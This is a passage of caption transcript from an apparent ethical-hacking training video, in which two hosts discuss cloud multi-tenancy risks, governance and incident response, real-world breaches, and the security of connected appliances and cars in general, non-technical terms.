00:21:43.620\nSo now we've transferred\na lot of that risk,\n\n459\n00:21:43.620 --> 00:21:47.930\nI've got to trust that they're doing\ntheir job keeping my data separate from\n\n460\n00:21:47.930 --> 00:21:50.160\nother customers data\nthat they're providing.\n\n461\n00:21:50.160 --> 00:21:53.740\n>> Okay, so the cloud provider has to be\nable to really exercise due care and due\n\n462\n00:21:53.740 --> 00:21:58.500\ndiligence to be able to, in a multi tenant\nenvironment, of course I can help you,\n\n463\n00:21:58.500 --> 00:22:01.710\nlet me take that for you Mr Jones,\nMrs Smith you go over here.\n\n464\n00:22:01.710 --> 00:22:03.280\nWe've got to put everything\nin the right place and\n\n465\n00:22:03.280 --> 00:22:05.520\nkeep all those boxes\nseparate from each other.\n\n466\n00:22:05.520 --> 00:22:09.780\nSo logical and physical isolation from\na security perspective become important.\n\n467\n00:22:09.780 --> 00:22:14.010\nWe talked about things like VLANing,\nbeing a logical security control, but\n\n468\n00:22:14.010 --> 00:22:18.390\nalso making sure that dedicated IP\nranges with subnets are gonna be used so\n\n469\n00:22:18.390 --> 00:22:21.760\nthat we have physical and\nlogical isolation for traffic flows.\n\n470\n00:22:21.760 --> 00:22:24.440\nEncryption, never go wrong\nwith using encryption.\n\n471\n00:22:24.440 --> 00:22:28.950\nIt's the universal answer to every\nquestion with regards to security.\n\n472\n00:22:28.950 --> 00:22:31.870\nSo you'll always get a question right\nif you say encryption is the answer,\n\n473\n00:22:31.870 --> 00:22:34.480\nbecause there's never a bad\ntime to use encryption.\n\n474\n00:22:34.480 --> 00:22:39.350\nSo encrypting all the data flows on the\nnetwork between the individual tenants and\n\n475\n00:22:39.350 --> 00:22:42.370\nthe provider is gonna add\nadditional layers of control and\n\n476\n00:22:42.370 --> 00:22:44.510\ntherefore additional layers of security.\n\n477\n00:22:44.510 --> 00:22:46.920\nMaking sure we have access control, and\n\n478\n00:22:46.920 --> 00:22:49.420\nwe're using multi factor\nversus single factor.\n\n479\n00:22:49.420 --> 00:22:53.910\nIdentifying individual users by more\nthan one attribute to make sure we\n\n480\n00:22:53.910 --> 00:22:57.750\nknow who they are as they come in and\nwe route them to the right place.\n\n481\n00:22:57.750 --> 00:23:01.600\nHaving perhaps dedicated hosting versus\nmulti tenant environments would also\n\n482\n00:23:01.600 --> 00:23:02.110\nbe important.\n\n483\n00:23:02.110 --> 00:23:03.980\nBut, you mentioned,\ndefinitely multi tenant.\n\n484\n00:23:03.980 --> 00:23:07.740\nAnd, the majority of the cloud is\ndone through multi tenant platform\n\n485\n00:23:07.740 --> 00:23:08.340\narchitecture.\n\n486\n00:23:08.340 --> 00:23:11.290\nSo, lots of individuals\nbeing aggregated together,\n\n487\n00:23:11.290 --> 00:23:15.040\nin common hardware\ninfrastructure resource pools.\n\n488\n00:23:15.040 --> 00:23:19.290\nCommon carrier networks, common backend\nstorage systems that are, to your point,\n\n489\n00:23:19.290 --> 00:23:22.690\nchopped up, 4, 6, 8, 20,\n30 times, whatever it is.\n\n490\n00:23:22.690 --> 00:23:27.030\nBut we may pay a premium as a cloud\ncustomer and get dedicated hardware and\n\n491\n00:23:27.030 --> 00:23:31.230\ndedicated hosting is possible,\neverything else it's a la carte.\n\n492\n00:23:31.230 --> 00:23:33.590\nI want to spend that much more,\nI can have that, but\n\n493\n00:23:33.590 --> 00:23:35.994\nhere's one of the things\nmost people don't realize.\n\n494\n00:23:35.994 --> 00:23:38.139\nI'm doing dedicated hosting,\nokay, no big deal,\n\n495\n00:23:38.139 --> 00:23:40.594\nI've taken care of most if not\nall of my security concerns.\n\n496\n00:23:40.594 --> 00:23:41.389\nWell you have, but\n\n497\n00:23:41.389 --> 00:23:44.580\nwhat about the fact that you're still\nrunning on common networks, right?\n\n498\n00:23:44.580 --> 00:23:49.082\nSo a lot of the times you do dedicated\nhosting, you're not getting dedicated\n\n499\n00:23:49.082 --> 00:23:53.518\nnetwork And dedicated bandwidth unless\nyou provision your own circuits and\n\n500\n00:23:53.518 --> 00:23:55.150\npay extra on top for that.\n\n501\n00:23:55.150 --> 00:23:57.170\nYou're gonna get dedicated hosts.\n\n502\n00:23:57.170 --> 00:23:59.310\nYou're gonna get the ability\nto have dedicated storage.\n\n503\n00:23:59.310 --> 00:24:02.700\nAlthough, there is a premium for\nthat on top of dedicated hosts.\n\n504\n00:24:02.700 --> 00:24:05.940\nYou're gonna have those options but\nunless you go down the list and\n\n505\n00:24:05.940 --> 00:24:07.420\nget dedicated everything.\n\n506\n00:24:07.420 --> 00:24:10.330\nAll that good work you just did\non the hardware platform side,\n\n507\n00:24:10.330 --> 00:24:12.905\nis nullified by the fact that you're\nrunning on the same common carrier\n\n508\n00:24:12.905 --> 00:24:15.590\nnetwork that all the other\ntenants are running on.\n\n509\n00:24:15.590 --> 00:24:19.080\nAnd if the provider to your\npoint doesn't do a good job\n\n510\n00:24:19.080 --> 00:24:22.560\nof figuring out how to secure\nthat traffic with encryption and\n\n511\n00:24:22.560 --> 00:24:27.490\nwith all the things we've talked about,\nVLANing and subnetting, etcetera.\n\n512\n00:24:27.490 --> 00:24:30.700\nYour traffic is still going into\nthe pool and everybody else's.\n\n513\n00:24:30.700 --> 00:24:35.120\nYou just spent a whole bunch of money to\nbe able to highlight this significant\n\n514\n00:24:35.120 --> 00:24:38.930\nweakness in the model and make it easier\nfor hackers to figure out how to find you.\n\n515\n00:24:38.930 --> 00:24:41.800\nRight?\nSo you've secure the physical layers.\n\n516\n00:24:41.800 --> 00:24:44.430\nYou've forgot about the traffic layer\nis what I'm suggesting to you, and\n\n517\n00:24:44.430 --> 00:24:48.190\nas an ethical hacker, it would be\nimportant for you to understand this.\n\n518\n00:24:48.190 --> 00:24:50.498\nEverything has a potential upside.\n\n519\n00:24:50.498 --> 00:24:51.700\nYou can fix any problem.\n\n520\n00:24:51.700 --> 00:24:55.990\nThe question is, is it economically\nfeasible to do so for the customer?\n\n521\n00:24:55.990 --> 00:24:58.240\nFor money, we often say,\nwe can fix anything.\n\n522\n00:24:58.240 --> 00:25:00.340\nBut the question is how\nmuch is that gonna cost?\n\n523\n00:25:00.340 --> 00:25:01.450\nI often tell my customers,\n\n524\n00:25:01.450 --> 00:25:04.550\nhow many zeros on the end of the check\nare you getting ready to write.\n\n525\n00:25:04.550 --> 00:25:08.560\nIs that box big enough to put the number\nof zeros on there we're gonna need\n\n526\n00:25:08.560 --> 00:25:09.760\nto fix that problem?\n\n527\n00:25:09.760 --> 00:25:11.695\nSo these are definitely some concerns,\nright?\n\n528\n00:25:11.695 --> 00:25:14.285\nWhat about some others,\nhow about licensing risk, right?\n\n529\n00:25:14.285 --> 00:25:18.315\nFor instance, in the past model, we don't\nown the operating system installation and\n\n530\n00:25:18.315 --> 00:25:20.605\nlicensing, the vendor does,\nthe cloud provider does.\n\n531\n00:25:20.605 --> 00:25:22.285\nWe assume, and rightly so, right?\n\n532\n00:25:22.285 --> 00:25:26.565\nThat they are gonna have proper licensed\nsystems and setting up, all that stuff.\n\n533\n00:25:26.565 --> 00:25:29.455\nAnd SaaS as well, we don't own\nthe licenses, the vendor does.\n\n534\n00:25:29.455 --> 00:25:32.320\nBut what about in IaaS, we, the customer,\n\n535\n00:25:32.320 --> 00:25:34.550\nare putting operating\nsystems on that platform.\n\n536\n00:25:34.550 --> 00:25:36.470\nWhat if we use unlicensed product?\n\n537\n00:25:36.470 --> 00:25:39.160\nWhat if we use a, or we borrow, right?\n\n538\n00:25:39.160 --> 00:25:40.370\nSomebody's product.\n\n539\n00:25:40.370 --> 00:25:46.680\nWe're not downloading and using a licensed\ninstallation ISO we're using our own.\n\n540\n00:25:46.680 --> 00:25:47.710\nAnd so that can be an issue,\n\n541\n00:25:47.710 --> 00:25:51.570\nbecause the Cloud provider doesn't know\nwe're running unlicensed software.\n\n542\n00:25:51.570 --> 00:25:53.180\nAnd that's gonna be a problem for us.\n\n543\n00:25:53.180 --> 00:25:56.140\nWhat about loss of governance, risk and\ncompliance concerns in general,\n\n544\n00:25:56.140 --> 00:25:58.030\nor, GRC, governance risk compliance.\n\n545\n00:25:58.030 --> 00:26:01.920\nBut especially, loss of governance,\nloss of compliance, inability to manage,\n\n546\n00:26:01.920 --> 00:26:03.900\ninability to manage and identify risk.\n\n547\n00:26:03.900 --> 00:26:08.880\nBecause of the different models, we're\ngiving away elements of control that as\n\n548\n00:26:08.880 --> 00:26:13.310\na customer on an internal privately\nmanaged network in traditional models,\n\n549\n00:26:13.310 --> 00:26:16.880\nwe as the business owners and the customer\nwould have directly in our control.\n\n550\n00:26:16.880 --> 00:26:18.200\n>> Yeah.\n>> But that can be an issue.\n\n551\n00:26:18.200 --> 00:26:20.480\n>> Incidence response becomes a challenge.\n\n552\n00:26:20.480 --> 00:26:23.160\n>> Can definitely be a challenge,\nso can auditability.\n\n553\n00:26:23.160 --> 00:26:24.810\nAnd, that goes back to\nthe whole governance things,\n\n554\n00:26:24.810 --> 00:26:27.550\nboth of them we were just talking,\nyou mentioned the one I just threw in.\n\n555\n00:26:27.550 --> 00:26:28.730\nBut yeah, absolutely.\n\n556\n00:26:28.730 --> 00:26:31.790\nAuditing becomes a major issue,\nso does incident management, and\n\n557\n00:26:31.790 --> 00:26:32.840\nincident response.\n\n558\n00:26:32.840 --> 00:26:36.140\nBecause we may not have the right to\nbe able to go to the cloud providers\n\n559\n00:26:36.140 --> 00:26:40.150\ninfrastructure site, their data center,\nand show up and do incident response.\n\n560\n00:26:40.150 --> 00:26:43.080\nThe cloud provider most\nlikely has to do that for us.\n\n561\n00:26:43.080 --> 00:26:44.110\nAre there people trying?\n\n562\n00:26:44.110 --> 00:26:46.310\nDo they understand the forensic process?\n\n563\n00:26:46.310 --> 00:26:50.300\nAre they going to be able to get it done\ncorrectly or are they gonna screw it up?\n\n564\n00:26:50.300 --> 00:26:52.730\nWill they let a third party come in and\n\n565\n00:26:52.730 --> 00:26:55.580\nessentially monitor our\ntraffic without our knowledge.\n\n566\n00:26:55.580 --> 00:26:58.540\nThis is the whole raging debate\nthat's been going on In the U.S.\n\n567\n00:26:58.540 --> 00:27:02.210\nespecially, but around the world with\nregards to the exposures that happened\n\n568\n00:27:02.210 --> 00:27:05.300\nthrough the Edward Snowden leak and\nleaks, other leaks like that.\n\n569\n00:27:05.300 --> 00:27:08.010\nWikiLeaks in general and\nthat whole thought process\n\n570\n00:27:08.010 --> 00:27:11.440\nwhere we now know unequivocally and\nhave known for years, by the way.\n\n571\n00:27:11.440 --> 00:27:15.190\nBut we know unequivocally now, those of us\nthat do this for a living have known for\n\n572\n00:27:15.190 --> 00:27:17.520\na long time that this has been going on.\n\n573\n00:27:17.520 --> 00:27:18.040\nRight?\n\n574\n00:27:18.040 --> 00:27:23.470\nThat governments and government sponsored\nentities and agencies in a variety\n\n575\n00:27:23.470 --> 00:27:28.955\nof countries, not just in the U.S. have\nbeen co-opting technology companies and\n\n576\n00:27:28.955 --> 00:27:33.260\nco-opting cloud companies and\nhave back doored these systems and\n\n577\n00:27:33.260 --> 00:27:36.990\nare surreptitiously\nessentially gathering data.\n\n578\n00:27:36.990 --> 00:27:38.490\nWhether you agree with what's happening or\n\n579\n00:27:38.490 --> 00:27:40.840\nnot, and\nI'm not here to discuss the legality.\n\n580\n00:27:40.840 --> 00:27:42.720\nI'm not here to discuss the political.\n\n581\n00:27:42.720 --> 00:27:44.960\nAnd the ethical ramifications of this.\n\n582\n00:27:44.960 --> 00:27:47.820\nLet's just be realists for a moment,\nyou may not like it, but it's happening.\n\n583\n00:27:47.820 --> 00:27:50.020\nSo whether you want it or not, it's there.\n\n584\n00:27:50.020 --> 00:27:53.820\nPoint is, today,\nif you are using these

business.\n\n587\n00:27:58.370 --> 00:27:59.620\nAs an ethical hacker,\n\n588\n00:27:59.620 --> 00:28:03.995\nthis is a risk you need to identify and\nyou need to call out for you customers.\n\n589\n00:28:03.995 --> 00:28:08.483\nAnything that they truly, truly want\nto keep secure and not have falling in\n\n590\n00:28:08.483 --> 00:28:12.971\nthe wrong hands, should never see\nthe light of day on a computer network and\n\n591\n00:28:12.971 --> 00:28:16.625\nshould never ever be put in\na clock under any circumstances.\n\n592\n00:28:16.625 --> 00:28:20.450\nI don't care what it is, I don't care\nwhat promises your provider has made you.\n\n593\n00:28:20.450 --> 00:28:23.180\nI don't care what you think as\na professional you can do to safe guard\n\n594\n00:28:23.180 --> 00:28:24.350\nthat information.\n\n595\n00:28:24.350 --> 00:28:28.740\nThe minute it leaves your jurisdiction\nin your building on your computers,\n\n596\n00:28:28.740 --> 00:28:32.750\ncrosses that boundary through your router,\ngoes out the WAN side and\n\n597\n00:28:32.750 --> 00:28:35.630\nhits somebody else's network,\nyou've lost control.\n\n598\n00:28:35.630 --> 00:28:37.870\nI don't care what you've done,\nyou've lost control.\n\n599\n00:28:37.870 --> 00:28:42.200\nYou may have encrypted it with kryptonite\nand it will never ever see the light of\n\n600\n00:28:42.200 --> 00:28:45.580\nday because nobody's gonna be able\nto unencrypt it, wrong, right?\n\n601\n00:28:45.580 --> 00:28:49.320\nCuz we know that there are entities out\nthere, they often have three letter\n\n602\n00:28:49.320 --> 00:28:53.230\nacronyms associated with their names and\nthey often are going to work for\n\n603\n00:28:53.230 --> 00:28:56.480\ngovernments that if they wanted\nbadly enough will take it and\n\n604\n00:28:56.480 --> 00:28:59.885\nmost likely have the means to\ndecrypt whatever you have encrypted.\n\n605\n00:28:59.885 --> 00:29:03.385\nI'm not suggesting for a minute that\nwe crawl into a hole in the ground,\n\n606\n00:29:03.385 --> 00:29:06.025\ncover ourselves up and wait for\nthe end to come, right?\n\n607\n00:29:06.025 --> 00:29:08.545\nIt's not that bad at least not today.\n\n608\n00:29:08.545 --> 00:29:09.965\nToday is not Monday so it's not that bad.\n\n609\n00:29:09.965 --> 00:29:11.890\nIf it was Monday different

people.\n\n614\n00:29:21.935 --> 00:29:22.710\n>> [LAUGH]\n>> [LAUGH] And\n\n615\n00:29:22.710 --> 00:29:24.710\nas a result nobody really cares.\n\n616\n00:29:24.710 --> 00:29:26.380\nJust honestly, right?\n\n617\n00:29:26.380 --> 00:29:31.320\nUnless you are engaged in certain high\nrisk and or high level activities in\n\n618\n00:29:31.320 --> 00:29:35.754\ncertain key businesses,\ndefense and military work, right?\n\n619\n00:29:35.754 --> 00:29:38.124\nBio-pharmaceuticals today.\n\n620\n00:29:38.124 --> 00:29:41.614\nCertainly there are definitely industries,\nfinancial services,\n\n621\n00:29:41.614 --> 00:29:44.655\nthe hacks on a swift wire system,\nover the last month or so.\n\n622\n00:29:44.655 --> 00:29:48.667\nHave proven without a reasonable doubt\nthat when you piss off North Korea badly\n\n623\n00:29:48.667 --> 00:29:52.276\nenough they actually can come out and\ndecide they wanna play, right?\n\n624\n00:29:52.276 --> 00:29:56.236\nAnd the fact that, the DNC,\nthe Democratic National Committee here in\n\n625\n00:29:56.236 --> 00:29:59.074\nthe United States,\nwas hacked over the last year.\n\n626\n00:29:59.074 --> 00:30:04.260\nAnd was, essentially, today they came out\nand said, it was a lone hacker, right?\n\n627\n00:30:04.260 --> 00:30:07.379\nSomebody supposedly claimed\nresponsibility for that.\n\n628\n00:30:07.379 --> 00:30:09.920\nBut the reality is we know,\npretty unequivocally,\n\n629\n00:30:09.920 --> 00:30:13.675\nit seems that the evidence points to\nthe fact it was state sponsored hacking on\n\n630\n00:30:13.675 --> 00:30:15.430\nbehalf of the Russian government.\n\n631\n00:30:15.430 --> 00:30:17.270\nTrying to gain political insight and\n\n632\n00:30:17.270 --> 00:30:21.215\nintelligence with regards to strategy and\nthe political\n\n633\n00:30:21.215 --> 00:30:25.445\ntheater that has been going on in the\nelection year here in the United States.\n\n634\n00:30:25.445 --> 00:30:30.195\nIt's always fun when the powers-that-be\ndecide they want to get together and\n\n635\n00:30:30.195 --> 00:30:31.925\njoust in the political arena here, right?\n\n636\n00:30:31.925 --> 00:30:34.565\nSo, we had a lot of interesting\nstuff going on, right?\n\n637\n00:30:34.565 --> 00:30:37.260\nDuring this year and\nthe election cycle, good bad and\n\n638\n00:30:37.260 --> 00:30:40.960\ndifferent from what it is, has become\nthe target of cloud-based hacking.\n\n639\n00:30:40.960 --> 00:30:44.190\nIt's interesting, as we talk\nabout this topic, that the hack,\n\n640\n00:30:44.190 --> 00:30:48.070\napparently, was in place for\na year before anybody figured it out.\n\n641\n00:30:48.070 --> 00:30:51.060\nAnd it took the DNC a year\nto come to the realization\n\n642\n00:30:51.060 --> 00:30:53.010\nthat their systems have been compromised.\n\n643\n00:30:53.010 --> 00:30:54.535\nThey called the security company.\n\n644\n00:30:54.535 --> 00:30:57.560\nWithin 24 hours,\nthey figured out this was going on.\n\n645\n00:30:57.560 --> 00:31:02.660\nCuz it's not that hard once you know that\nyou're looking at a potential compromise\n\n646\n00:31:02.660 --> 00:31:07.815\nto zero in on unlikely behavior and\ndifficult circumstances that look unusual,\n\n647\n00:31:07.815 --> 00:31:11.605\nbut to the untrained eye may\nnot equate to bad behavior.\n\n648\n00:31:11.605 --> 00:31:13.965\nBut then you call in the professionals and\nguess what?\n\n649\n00:31:13.965 --> 00:31:17.495\nThe CEHs of the world get to do their\njob and we find out, sure enough,\n\n650\n00:31:17.495 --> 00:31:19.310\nyeah rhat is unusual, right?\n\n651\n00:31:19.310 --> 00:31:22.510\nThere shouldn't be that kind of\nactivity streaming out of that system\n\n652\n00:31:22.510 --> 00:31:24.260\nat that time of day on those ports.\n\n653\n00:31:24.260 --> 00:31:27.934\nWe talked about in our prior episodes\nwith the fingerprinting and the recon and\n\n654\n00:31:27.934 --> 00:31:30.504\nthe enumeration and\nthe system hacking discussions.\n\n655\n00:31:30.504 --> 00:31:34.390\nAbout understanding the profile of\nactivity, looking for the deltas,\n\n656\n00:31:34.390 --> 00:31:38.213\nfocusing on the key differentiators,\nand when you see that behavior,\n\n657\n00:31:38.213 --> 00:31:40.140\nflagging it for what it is, right?\n\n658\n00:31:40.140 --> 00:31:41.357\nAnd this is a classic example.\n\n659\n00:31:41.357 --> 00:31:45.360\nThe cloud was used to gain an advantage\nin the system for, in this case,\n\n660\n00:31:45.360 --> 00:31:47.660\npolitical intelligence, right?\n\n661\n00:31:47.660 --> 00:31:51.783\nAnd to gain insight into strategy and\nthings that were going on there.\n\n662\n00:31:51.783 --> 00:31:54.070\nGood, bad, right, wrong,\nit is what it is, it happened.\n\n663\n00:31:54.070 --> 00:31:57.041\nSo the reality is this\nstuff happens all the time.\n\n664\n00:31:57.041 --> 00:31:58.504\niCloud was hacked last year, right.\n\n665\n00:31:58.504 --> 00:32:00.686\nYou had all the photos go up on the web.\n\n666\n00:32:00.686 --> 00:32:03.800\nJP Morgan Chase,\none of the biggest banks around, right.\n\n667\n00:32:03.800 --> 00:32:05.130\nHacked, last year.\n\n668\n00:32:05.130 --> 00:32:07.250\nHome Depot here in the US.\n\n669\n00:32:07.250 --> 00:32:09.710\nTarget here in the United States\naround the world not just here.\n\n670\n00:32:09.710 --> 00:32:11.040\nBoth companies are global.\n\n671\n00:32:11.040 --> 00:32:13.276\nBut certainly the hacks occurred\nhere in the United States.\n\n672\n00:32:13.276 --> 00:32:14.790\nAll this stuff happens.\n\n673\n00:32:14.790 --> 00:32:15.960\nIt's all happening through the cloud.\n\n674\n00:32:15.960 --> 00:32:18.190\nIf we would just shut the cloud off,\nright?\n\n675\n00:32:18.190 --> 00:32:21.260\nGet a strong fan on top of\nthe building and blow the clouds away.\n\n676\n00:32:21.260 --> 00:32:23.570\nThat's probably the best defensive\nmechanism we have by the way,\n\n677\n00:32:23.570 --> 00:32:25.480\nkeep the clouds away, right?\n\n678\n00:32:25.480 --> 00:32:27.430\nBut it's hard to do, let's be honest.\n\n679\n00:32:27.430 --> 00:32:28.570\nHave you met a company?\n\n680\n00:32:28.570 --> 00:32:29.720\nDo you of a person?\n\n681\n00:32:29.720 --> 00:32:32.990\nDo you know of an entity that doesn't\nsomehow in some way connect to\n\n682\n00:32:32.990 --> 00:32:33.720\nthe cloud today?\n\n683\n00:32:33.720 --> 00:32:35.700\n>> No.\n>> I often have this conversation\n\n684\n00:32:35.700 --> 00:32:36.410\nwith customers.\n\n685\n00:32:36.410 --> 00:32:40.110\nIn all my years that I have been doing\nthis and specifically in the last decade,\n\n686\n00:32:40.110 --> 00:32:40.690\napproximately.\n\n687\n00:32:40.690 --> 00:32:44.600\nThe cloud has really come into its own in\nsome form or another has become a reality.\n\n688\n00:32:44.600 --> 00:32:49.240\nEssentially, the last five to seven\nyears in particular has really become\n\n689\n00:32:49.240 --> 00:32:52.140\nsomething that has become\na force to be reckoned with.\n\n690\n00:32:52.140 --> 00:32:55.680\nI can think of only one customer in all\nthe years that I've been doing this that\n\n691\n00:32:55.680 --> 00:32:59.280\nhas said, unequivocally, we're not going\ninto the cloud, under any circumstance,\n\n692\n00:32:59.280 --> 00:33:01.480\nfor any reason.\n\n693\n00:33:01.480 --> 00:33:03.430\nI've got a lot of customers\nthat are cloud adverse,\n\n694\n00:33:03.430 --> 00:33:05.400\nthey're not real happy about the idea.\n\n695\n00:33:05.400 --> 00:33:07.120\nThey're thinking about it,\nthey'll dabble with it, but\n\n696\n00:33:07.120 --> 00:33:08.880\nover time they start connecting.\n\n697\n00:33:08.880 --> 00:33:11.510\nEmail goes, we'll outsource this,\nwe'll do that.\n\n698\n00:33:11.510 --> 00:33:14.120\nI have one customer that's just\nadamantly said under no circumstances.\n\n699\n00:33:14.120 --> 00:33:15.760\nI don't care what it is,\nwe're not doing it.\n\n700\n00:33:15.760 --> 00:33:19.530\nOur customers don't want it and\nwe are not prepared to take the risk.\n\n701\n00:33:19.530 --> 00:33:22.570\nThat's one customer out of\nthousands that I can think of.\n\n702\n00:33:22.570 --> 00:33:25.460\nSo reality is, I mean,\nlook around you today.\n\n703\n00:33:25.460 --> 00:33:27.630\nYou guys are consuming this\ndiscussion right here and\n\n704\n00:33:27.630 --> 00:33:29.660\nall of our discussions via the cloud.\n\n705\n00:33:29.660 --> 00:33:33.060\nThe cloud is everywhere today,\nyour cars are wired to it, right?\n\n706\n00:33:33.060 --> 00:33:35.470\nFor God's sake your refrigerator\ncould be wired to it.\n\n707\n00:33:35.470 --> 00:33:38.740\nWho the hell goes out and\nbuys a $6000 refrigerator so\n\n708\n00:33:38.740 --> 00:33:43.100\nyou have three cameras over the cloud that\ncan tell you that you're out of milk?\n\n709\n00:33:43.100 --> 00:33:45.670\nThere are some things I don't get.\n\n710\n00:33:45.670 --> 00:33:49.730\nI consider myself to be\na fairly educated individual.\n\n711\n00:33:49.730 --> 00:33:53.130\nI read a lot, traditional books,\nreal stuff with paper on them.\n\n712\n00:33:53.130 --> 00:33:55.110\nI look at things.\n\n713\n00:33:55.110 --> 00:33:57.160\nI try to question what I see around me.\n\n714\n00:33:57.160 --> 00:33:58.720\nI try to be open minded.\n\n715\n00:33:58.720 --> 00:34:00.030\nI'm all those things.\n\n716\n00:34:00.030 --> 00:34:01.160\nAnd at the same time,\n\n717\n00:34:01.160 --> 00:34:05.240\nI still am the person that would never\nbuy a $6000 cloud enabled refrigerator.\n\n718\n00:34:05.240 --> 00:34:07.420\n>> Not even to keep your stove company?\n\n719\n00:34:07.420 --> 00:34:08.830\n>> No, no.\n\n720\n00:34:08.830 --> 00:34:10.300\nI never thought of it that way.\n\n721\n00:34:10.300 --> 00:34:12.870\n>> Cuz you're stove is connected and\nit's gotta talk to somebody.\n\n722\n00:34:12.870 --> 00:34:15.900\nI did not consider the social needs and\n\n723\n00:34:15.900 --> 00:34:20.220\nthe social health and well being\nof my kitchen appliances that way.\n\n724\n00:34:20.220 --> 00:34:24.140\nAnd thinking about the fact that the stove\nwould get lonely, because let's be honest,\n\n725\n00:34:24.140 --> 00:34:26.130\nwe all get lonely from time to time.\n\n726\n00:34:26.130 --> 00:34:29.620\nMike clearly has this issue or he wouldn't\nbe talking about how lonely the stove is.\n\n727\n00:34:29.620 --> 00:34:30.209\n>> [LAUGH]\n>> But\n\n728\n00:34:30.209 --> 00:34:32.318\nthe reality is that I never\nthought about it that way,\n\n729\n00:34:32.318 --> 00:34:34.134\nit's actually a very good counterargument.\n\n730\n00:34:34.134 --> 00:34:37.458\nNot one that will convince me,\nbut it's a good counterargument.\n\n731\n00:34:37.458 --> 00:34:41.098\nSo that I would have to now buy\nthe cloud enabled appliance package for\n\n732\n00:34:41.098 --> 00:34:44.230\nthe home,\nas opposed to simply one appliance.\n\n733\n00:34:44.230 --> 00:34:45.010\nInteresting.\n\n734\n00:34:45.010 --> 00:34:47.473\nI'm glad my wife is not\nlistening to this conversation.\n\n735\n00:34:47.473 --> 00:34:49.710\n>> [LAUGH]\n>> Because we're not spending that kind of\n\n736\n00:34:49.710 -->

00:35:08.710\nI don't wanna minimize the fact\nthat that technology is awesome.\n\n744\n00:35:08.710 --> 00:35:12.670\nThe things it can do and the innovation\nit takes to create that is great, and\n\n745\n00:35:12.670 --> 00:35:13.470\nI'm not kidding about that.\n\n746\n00:35:13.470 --> 00:35:15.280\nI think that is really fabulous.\n\n747\n00:35:15.280 --> 00:35:17.070\nI just don't see a need for it in my life.\n\n748\n00:35:17.070 --> 00:35:21.055\nAnd I don't see a need for it, from\na security perspective I have a lot of\n\n749\n00:35:21.055 --> 00:35:23.905\ntrouble with it because of\nthe implications of what it does\n\n750\n00:35:23.905 --> 00:35:28.535\nwith the broader issue of networking\nthe home and home control in general.\n\n751\n00:35:28.535 --> 00:35:33.987\nAnd opening that up without the proper\nsecurity to the cloud allowing people,\n\n752\n00:35:33.987 --> 00:35:36.647\npotentially bad actors,\nto gain an advantage.\n\n753\n00:35:36.647 --> 00:35:38.397\nI mean,\nnot that shutting the fridge off and\n\n754\n00:35:38.397 --> 00:35:39.957\nspoiling the milk is that big of a deal.\n\n755\n00:35:39.957 --> 00:35:40.557\nI get that.\n\n756\n00:35:40.557 --> 00:35:42.927\nYou know it can happen but\nthat's not really the issue.\n\n757\n00:35:42.927 --> 00:35:47.523\nThe issue is could somebody find a way\nto hack into that system and from there,\n\n758\n00:35:47.523 --> 00:35:49.233\njump into other systems.\n\n759\n00:35:49.233 --> 00:35:52.653\nPotentially a stove, turn the stove on and\ncause a fire, god forbid, or\n\n760\n00:35:52.653 --> 00:35:54.243\nsomething like that.\n\n761\n00:35:54.243 --> 00:35:58.350\nThat's the kind of stuff that keeps me up\nat night when I think about these systems.\n\n762\n00:35:58.350 --> 00:36:02.730\nWirelessly enabling, and Internet\nenabling my car, no thank you, right?\n\n763\n00:36:02.730 --> 00:36:04.460\nWe've talked about that in prior episodes.\n\n764\n00:36:04.460 --> 00:36:07.610\nI don't want somebody\nbeing able to hack into\n\n765\n00:36:07.610 --> 00:36:11.660\nmy automobile while I'm driving at 60\nmiles an hour down the road, with or\n\n766\n00:36:11.660 --> 00:36:14.450\nwithout other people in it or\nother people around me.\n\n767\n00:36:14.450 --> 00:36:17.640\nAnd deciding they want to see what\nthat switch or that light does.\n\n768\n00:36:17.640 --> 00:36:21.770\nThat's not what I'm interested in,\nthat is just a disaster waiting to happen.\n\n769\n00:36:21.770 --> 00:36:26.180\nThere's no other way to describe that, and\nyet every car manufacturer in the world\n\n770\n00:36:26.180 --> 00:36:29.550\nis trying to figure out how to do this and\ndo this securely.\n\n771\n00:36:29.550 --> 00:36:33.290\nThat's the big word and the big challenge\ncuz clearly that's not happening, right.\n\n772\n00:36:33.290 --> 00:36:36.230\nI mean,\nis it hard to hack into a car platform?\n\n773\n00:36:36.230 --> 00:36:37.490\nYeah, it's not easy.\n\n774\n00:36:37.490 --> 00:36:39.890\nCan you do it as certified\nethical hackers?\n\n775\n00:36:39.890 --> 00:36:42.195\nMost of you out there,\nif you really spent the time,\n\n776\n00:36:42.195 --> 00:36:45.740\nfigured out how to do the stuff that\nwe've talked about, do a little\n\n777\n00:36:45.740 --> 00:36:49.720\nresearch out there on the dark web\nprobably could, and that's the scary part.\n\n778\n00:36:49.720 --> 00:36:52.510\nNot that you guys could get good enough\nto do it, I think that's awesome,\n\n779\n00:36:52.510 --> 00:36:56.240\nthat all of you could learn how to do\nit and would indeed be able to do it.\n\n780\n00:36:56.240 --> 00:36:59.990\nI think that's great, from the perspective\nthat you've gotten that knowledge and\n\n781\n00:36:59.990 --> 00:37:02.750\nyou're now gonna become better\ndefenders of our systems.\n\n782\n00:37:02.750 --> 00:37:06.130\nI think that's wonderful but\nthe fact that you can do it is scary for\n\n783\n00:37:06.130 --> 00:37:07.780\nthe following reason.\n\n784\n00:37:07.780 --> 00:37:10.570\nIf you can do it what about all\nthe bad actors out there that can also\n\n785\n00:37:10.570 --> 00:37:11.360\nlearn how to do it?\n\n786\n00:37:11.360 --> 00:37:14.450\nAnd how many of them are gonna go\ndo it for the wrong reasons and\n\n787\n00:37:14.450 --> 00:37:17.170\nactually look to hurt people or\nlook to gain advantage.\n\n788\n00:37:17.170 --> 00:37:20.320\nAs opposed to you that are gonna look\nto do it for the right reasons, and\n\n789\n00:37:20.320 --> 00:37:22.220\nfigure out how to stop those bad people.\n\n790\n00:37:22.220 --> 00:37:24.337\nI mean,\nthat's the dark side of our conversations.\n\n791\n00:37:24.337 --> 00:37:28.575\nAnd everything we do in this particular\nset of episodes in this general thought\n\n792\n00:37:28.575 --> 00:37:30.140\nprocess around CEH.\n\n793\n00:37:30.140 --> 00:37:32.805\nIt's the bad people\ntaking this knowledge and\n\n794\n00:37:32.805 --> 00:37:36.225\nfiguring out how to manipulate it to\ntheir advantage that can cause harm.\n\n795\n00:37:36.225 --> 00:37:38.175\nI mean this is a really\nbig issue in the cloud.\n\n796\n00:37:38.175 --> 00:37:40.835\nWhat about insufficient,\nwe talked about things like insufficient\n\n797\n00:37:40.835 --> 00:37:45.025\ngovernance risk to the appliance, talked\nabout due diligence, hardware failure,\n\n798\n00:37:45.025 